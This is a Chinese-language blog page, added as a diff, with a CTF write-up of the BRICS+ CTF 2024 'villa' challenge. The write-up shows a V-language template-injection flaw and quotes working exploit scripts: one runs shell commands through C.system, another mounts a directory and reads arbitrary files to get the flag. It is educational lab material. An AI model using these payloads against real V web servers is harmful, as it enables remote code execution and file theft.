@@ -1,0 +1,796 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="莫道你在选择人 人亦能选择你 -《等(Live)》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BRICS+ CTF 2024 web&#x2F;villa复现">
+<meta property="og:url" content="http://example.com/2024/10/11/BRICS+%20CTF%202024%20web/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="莫道你在选择人 人亦能选择你 -《等(Live)》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/duo.png">
+<meta property="article:published_time" content="2024-10-11T05:14:59.000Z">
+<meta property="article:modified_time" content="2024-10-10T16:22:28.490Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="比赛Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/duo.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BRICS+ CTF 2024 web/villa复现 - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/" target="_self">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/deng.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BRICS+ CTF 2024 web/villa复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-11 13:14" pubdate>
+          2024年10月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BRICS+ CTF 2024 web/villa复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>官方wp&gt;&gt;&gt;<a target="_blank" rel="noopener" href="https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks">https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks</a></p>
+<h1 id="villa"><a href="#villa" class="headerlink" title="villa"></a><font style="color:rgb(31, 35, 40);">villa</font></h1><p>v语言写的一个web程序</p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">module main<br><br>import os<br>import vweb<br><br>struct App &#123;<br>	vweb.Context<br>&#125;<br><br>@[&#x27;/&#x27;; get; post]<br>fn (mut app App) index() vweb.Result &#123;<br>	return $vweb.html()<br>&#125;<br><br>@[&#x27;/villa&#x27;; get; post]<br>fn (mut app App) villa() vweb.Result &#123;<br>	if app.req.method == .post &#123;<br>		os.write_file(&#x27;villa.html&#x27;, $tmpl(&#x27;template.html&#x27;)) or &#123; panic(err) &#125;<br>	&#125;<br><br>	return $vweb.html()<br>&#125;<br><br>fn main() &#123;<br>	app := &amp;App&#123;&#125;<br>	params := vweb.RunParams&#123;<br>		port: 8080,<br>		nr_workers: 1,<br>    &#125;<br><br>	vweb.run_at(app, params) or &#123; panic(err) &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>/villa</code>路由将<code>$tmpl(&#39;template.html&#39;)</code>的返回值写入<code>villa.html</code></p>
+<p><code>template.html</code>的<code>@app.req.data</code>接收用户传入的值，这是整个程序唯一的输入点</p>
+<p>在docker的启动脚本里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp villa.html villa.html.bak<br><br>while true; do<br>    sleep 30<br>    cp villa.html.bak villa.html<br>done &amp;<br></code></pre></td></tr></table></figure>
+
+<p>每30秒重置<code>villa.html</code></p>
+<p>通过<code>$vweb.html()</code>渲染html</p>
+<p>替换html时经过了<code>$tmpl</code>函数处理</p>
+<p>查看该引擎的源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vlang/v/blob/715dc3116123b69abe25d14536cad18da6bd7ab6/vlib/v/parser/tmpl.v#L397">https://github.com/vlang/v/blob/715dc3116123b69abe25d14536cad18da6bd7ab6/vlib/v/parser/tmpl.v#L397</a><br>该引擎处理模板文件，将其转换为V语言代码</p>
+<p>根据官方wp给出的片段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#125; else if line_t.starts_with(&#x27;.&#x27;) &amp;&amp; line.ends_with(&#x27;&#123;&#x27;) &#123;<br>    // `.header &#123;` =&gt; `&lt;div class=&#x27;header&#x27;&gt;`<br>    class := line.find_between(&#x27;.&#x27;, &#x27;&#123;&#x27;).trim_space()<br>    trimmed := line.trim_space()<br>    source.write_string(strings.repeat(`\t`, line.len - trimmed.len)) // add the necessary indent to keep &lt;div&gt;&lt;div&gt;&lt;div&gt; code clean<br>    source.writeln(&#x27;&lt;div class=&quot;$&#123;class&#125;&quot;&gt;&#x27;)<br>    continue<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/brics/1728404000635-dc9d6356-1f2d-486b-b5eb-a7a5a148da31.png" srcset="/img/loading.gif" lazyload></p>
+<p>该段代码会处理<code>.</code>开头<code>&#123;</code>结尾的行并截取两个符号之间的字符串作为<code>$&#123;class&#125;</code></p>
+<p>看官方给出的payload</p>
+<p>实际上是对<code>source.writeln(</code>进行闭合然后拼接shell命令，导致tmpl.v执行的同时执行shell命令导致rce</p>
+<p>插入payload后如下</p>
+<p><code>source.writeln(&#39;&lt;div class=&quot;&#39;); C.system(&#39;cat flag.*.txt &gt; villa.html&#39;.str); println(&#39;&quot;&gt;&#39;)</code></p>
+<p>实际上执行了<code>source.writeln(&#39;&lt;div class=&quot;&#39;)``C.system(&#39;cat flag.*.txt &gt; villa.html&#39;.str)``println(&#39;&quot;&gt;&#39;)</code></p>
+<p>官方exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>HOST = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;localhost&#x27;</span><br>PORT = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">17171</span><br><br>URL = <span class="hljs-string">f&#x27;http://ip:17171/villa&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        payload = <span class="hljs-string">&quot;\n. &#x27;); C.system(&#x27;cat flag.*.txt &gt; villa.html&#x27;.str); println(&#x27; &#123;\n&quot;</span><br>        requests.post(URL, data = payload)<br><br>        response = requests.get(URL)<br>        <span class="hljs-built_in">print</span>(response.content)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.content:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>    time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+
+<p>要注意到的是这里前后加上换行是为了让payload单独一行，才能正确让<code>tmpl</code>截取到我们的payload</p>
+<p><img src="/mdimg/brics/1728404419139-7690f3b1-708a-45da-a43e-75e31b66f470.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里执行system命令要<code>C.system</code>但是<code>os.system</code>跑不通</p>
+<p>于是又找到了一个文章 <a target="_blank" rel="noopener" href="https://dreyand.rs/ctf/2024/10/06/vlang-template-injection-lazy-loading-iframes-ss-leaks-brics-ctf-quals">https://dreyand.rs/ctf/2024/10/06/vlang-template-injection-lazy-loading-iframes-ss-leaks-brics-ctf-quals</a></p>
+<blockquote>
+<p><font style="color:rgb(34, 34, 34);">* Side note: Someone in the discord also found a way to get full RCE, as shared by :</font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;кек&lt;/font&gt;</code></p>
+<p><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;$&#123; C.system(&amp;char(“cat flag* &gt; /tmp/villa/villa.html”.str)) &#125;&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> . yes, you can use C in V ))</font></p>
+<p><font style="color:rgb(34, 34, 34);">That’s an insane functionality provided by the language XD</font></p>
+</blockquote>
+<p>通过<code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;language XD&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);">可以在Vlang执行C语言</font></p>
+<p><font style="color:rgb(34, 34, 34);">这篇文章提供了另外一个解法就是通过vweb的内置函数</font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;scan_static_directory&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);">来读取文件夹的文件列表。</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">fn (mut ctx Context) scan_static_directory(directory_path string, mount_path string, host string) &#123;<br>    files := os.ls(directory_path) <span class="hljs-keyword">or</span> &#123; panic(err) &#125;<br>    <span class="hljs-keyword">if</span> files.<span class="hljs-built_in">len</span> &gt; <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files &#123;<br>            full_path := os.join_path(directory_path, file)<br>            <span class="hljs-keyword">if</span> os.is_dir(full_path) &#123;<br>                ctx.scan_static_directory(full_path, mount_path.trim_right(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&#x27;/&#x27;</span> + file,<br>                    host)<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> file.contains(<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; !file.starts_with(<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; !file.ends_with(<span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                ext := os.file_ext(file)<br>                // Rudimentary guard against adding files <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mime_types.<br>                // Use host_serve_static directly to add non-standard mime types.<br>                <span class="hljs-keyword">if</span> ext <span class="hljs-keyword">in</span> mime_types &#123;<br>                    ctx.host_serve_static(host, mount_path.trim_right(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&#x27;/&#x27;</span> + file,<br>                        full_path)<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(26, 32, 41);">这个函数不是公开的，需要找到另一个调用它的函数。</font></p>
+<p><font style="color:rgb(26, 32, 41);">文章提供了3个</font></p>
+<blockquote>
+<p><font style="color:rgb(34, 34, 34);">All we have to do now is:</font></p>
+<ul>
+<li><font style="color:rgb(34, 34, 34);">use the</font><font style="color:rgb(34, 34, 34);"> </font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;host_mount_static_folder_at&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">gadget to</font><font style="color:rgb(34, 34, 34);"> </font><strong><font style="color:rgb(34, 34, 34);">mount</font></strong><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">the</font><font style="color:rgb(34, 34, 34);"> </font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;/tmp/villa&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">directory into a</font><font style="color:rgb(34, 34, 34);"> </font><strong><font style="color:rgb(34, 34, 34);">static</font></strong><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">one</font></li>
+<li><font style="color:rgb(34, 34, 34);">read the server config via</font><font style="color:rgb(34, 34, 34);"> </font><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;@app&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);"> </font><font style="color:rgb(34, 34, 34);">to get a</font><font style="color:rgb(34, 34, 34);"> </font><strong><font style="color:rgb(34, 34, 34);">list of files</font></strong><font style="color:rgb(34, 34, 34);">, including the filename of the flag.</font></li>
+<li><font style="color:rgb(34, 34, 34);">use the </font><strong><font style="color:rgb(34, 34, 34);">arb file read</font></strong><font style="color:rgb(34, 34, 34);"> gadget to get the flag</font></li>
+</ul>
+</blockquote>
+<p><font style="color:rgb(34, 34, 34);">exp</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> httpx <br><span class="hljs-keyword">import</span> re <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mount_static</span>(<span class="hljs-params">client</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    @&#123;dump(app.handle_static(&#x27;/tmp/villa&#x27;, true))&#125;</span><br><span class="hljs-string">    @&#123;dump(app.host_handle_static(&#x27;localhost&#x27;, &#x27;/tmp/villa&#x27;, true))&#125;</span><br><span class="hljs-string">    @&#123;dump(app.mount_static_folder_at(&#x27;/tmp/villa&#x27;, &#x27;/leak&#x27;))&#125;</span><br><span class="hljs-string">    @app</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <br>    resp = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-string">&quot;true&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp:<br>        <span class="hljs-keyword">try</span>:<br>            resp = client.post(<span class="hljs-string">&quot;/villa&quot;</span>, data=payload).text<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> <span class="hljs-comment"># server timeout</span><br>    <br>    flag_pattern = <span class="hljs-string">r&#x27;/tmp/villa/flag\.[a-f0-9]&#123;32&#125;\.txt&#x27;</span><br>    flag_loc = re.findall(flag_pattern, resp)<br>    <br>    <span class="hljs-keyword">return</span> flag_loc[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readflag</span>(<span class="hljs-params">client, flag_loc</span>):<br>    payload = <span class="hljs-string">&quot;@&#123;app.file(&#x27;%s&#x27;)&#125;&quot;</span> % (flag_loc)<br>    <br>    resp = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            resp = client.post(<span class="hljs-string">&quot;/villa&quot;</span>, data=payload).text<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> resp <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;brics&quot;</span> <span class="hljs-keyword">in</span> resp:<br>                <span class="hljs-built_in">print</span>(resp)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> <span class="hljs-comment"># server timeout</span><br>    <br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    BASE_URL = <span class="hljs-string">&quot;http://TARGET-URL&quot;</span><br>    client = httpx.Client(base_url=BASE_URL)<br>    <br>    flag_loc = mount_static(client)<br>    readflag(client, flag_loc)<br>    <br>     <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTFs/" class="category-chain-item">CTFs</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTFs/%E6%AF%94%E8%B5%9BWrite-Up/" class="category-chain-item">比赛Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9BWrite-Up/" class="print-no-link">#比赛Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BRICS+ CTF 2024 web/villa复现</div>
+      <div>http://example.com/2024/10/11/BRICS+ CTF 2024 web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/13/LIT%20CTF%202024%20web/" title="LIT CTF 2024 web">
+                        <span class="hidden-mobile">LIT CTF 2024 web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
